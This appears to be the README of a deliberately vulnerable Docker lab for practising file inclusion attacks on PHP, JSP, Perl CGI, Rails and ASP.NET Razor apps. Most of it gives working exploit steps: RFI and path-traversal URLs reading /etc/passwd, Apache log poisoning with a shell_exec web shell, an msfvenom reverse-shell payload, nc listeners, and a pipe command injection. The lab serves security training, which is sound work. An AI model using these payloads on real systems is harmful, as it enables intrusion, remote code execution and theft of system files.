# Installation

- Install Docker (verified with version 2.0.0.3)
- To run the linux network use `start_linux_network.sh` (see OS subsections if something is missing).
- The windows network examples were only checked on non-windows machines. For further instructions see the ASPX section.

## Ubuntu

Check if you have docker-machine and docker-compose also installed. 
Notice that if not added to docker group, docker has to be run with sudo.

## Windows

To run the linux network [Cmder](https://cmder.net/) was used on Windows. Instead of `start_linux_network.sh` run `docker-compose -f lfi_linux_network.yml up --build` to start. 

# Examples

Note, the reverse shell examples are verified with [Metasploit Version 5.0.37-dev](https://www.metasploit.com/) on [Kali Linux](https://www.kali.org/).

## RFI

For the RFI payloads you have to change the IP to the IP from the internal network in every link. Use `docker inspect <docker_attacker_id>` to get the IP.

## PHP

### RFI 

PoCs RFI:

- [http://127.0.0.1:8883/lfi.php?language=http://google.com?q=](http://127.0.0.1:8883/lfi.php?language=http://google.com?q=)

- [http://127.0.0.1:8883/lfi.php?page=http://textfiles.com](http://127.0.0.1:8883/lfi.php?page=http://textfiles.com)

Code running on the victim server:

- [http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_victim.txt](http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_victim.txt)

Code running on the attacker server:

- [http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_attacker.php](http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_attacker.php)

To get reverse shell you can use Metasploit:

`msfvenom -a php --platform php -p php/reverse_perl lhost=172.18.0.5 lport=4444`

### LFI

#### Verification

Upload check.php from attacker-server src folder

then:

- [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check) or
- [http://127.0.0.1:8883/lfi.php?language=uploads/check](http://127.0.0.1:8883/lfi.php?language=uploads/check)

#### Exploits

#### etc/passwd

[http://127.0.0.1:8883/lfi.php?page=/etc/passwd](http://127.0.0.1:8883/lfi.php?page=/etc/passwd)

By way of experiment add `../` before `etc/passwd` until ...

[http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd](http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd)

#### Log Injection

Get `access.log`: 

Changed here to `access_combined.log`. The used docker image pipes `access.log` to stdout, so the default log of the apache is know changed. (If somebody knows a way to change `access.log`->`stdout` for this image to write both to stdout and in the file help would be appreciated, please mail me):

[http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log](http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log)

Then use:

```
nc -nv 127.0.0.1 8883
<?php echo shell_exec($_GET['cmd']);?>
```

and

[http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id](http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id)

Check for uid in output

#### Shell

- Upload shell.php
- goto: [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell)
- then:

```
docker exec -ti <containerid_attackerserver> /bin/bash
nc 172.18.0.1 4444
```

## JSP

### RFI

- [http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor](http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor)

### LFI

Upload runme.jsp from attacker_server_jsp for Remote Code Execution:

- [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls)
- [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd)

## CGI / Perl

Single Container: Start it in the folder `victim_fi_server_cgi_perl`.

### RFI

[http://127.0.0.1:8895/cgi-bin/index.pl?file=https://www.google.de](http://127.0.0.1:8895/cgi-bin/index.pl?file=https://www.google.de)

### LFI

- /etc/passwd
[http://127.0.0.1:8895/cgi-bin/index.pl?file=/etc/passwd](http://127.0.0.1:8895/cgi-bin/index.pl?file=/etc/passwd)

- Outputs the current server folder:
[http://127.0.0.1:8895/cgi-bin/index.pl?file=ls|](http://127.0.0.1:8895/cgi-bin/index.pl?file=ls|)

## Rails

Another single container: To Start goto `victim_fi_server_rails` folder.

### LFI

`curl -X GET -H 'Accept: ../../../../../../../etc/passwd{{' http://localhost:8896/fileinclusion`

## ASP / Razor

Only verified on non-Windows machines. If you want to use this network also install [VirtualBox](https://www.virtualbox.org/).

Use [https://github.com/StefanScherer/windows-docker-machine](https://github.com/StefanScherer/windows-docker-machine) to get the docker environment.

Then you can start a windows ASPX Razor network with a victim machine (use `start_win_network.sh` or `docker-compose -f lfi_win_network.yml up --build`). After that you can verify the following payloads:

Upload the files and call:

`SimpleEchopayload.cshtml`

[http://192.168.99.90:8080/?test=SimpleEchoPayload.cshtml](http://192.168.99.90:8080/?test=SimpleEchoPayload.cshtml)

`WinLfiPayload.cshtml`

[http://192.168.99.90:8080/?test=WinLfiPayload.cshtml](http://192.168.99.90:8080/?test=WinLfiPayload.cshtml)

`CheckPowerShell.cshtml`

[http://192.168.99.90:8080/?test=CheckPowerShell.cshtml](http://192.168.99.90:8080/?test=CheckPowerShell.cshtml)

`RevShell.cshtml`, change IP to attacker server ip in the file

nc -nlvp 4444 at attacker server, then:

[http://192.168.99.90:8080/?test=RevShell.cshtml](http://192.168.99.90:8080/?test=RevShell.cshtml)

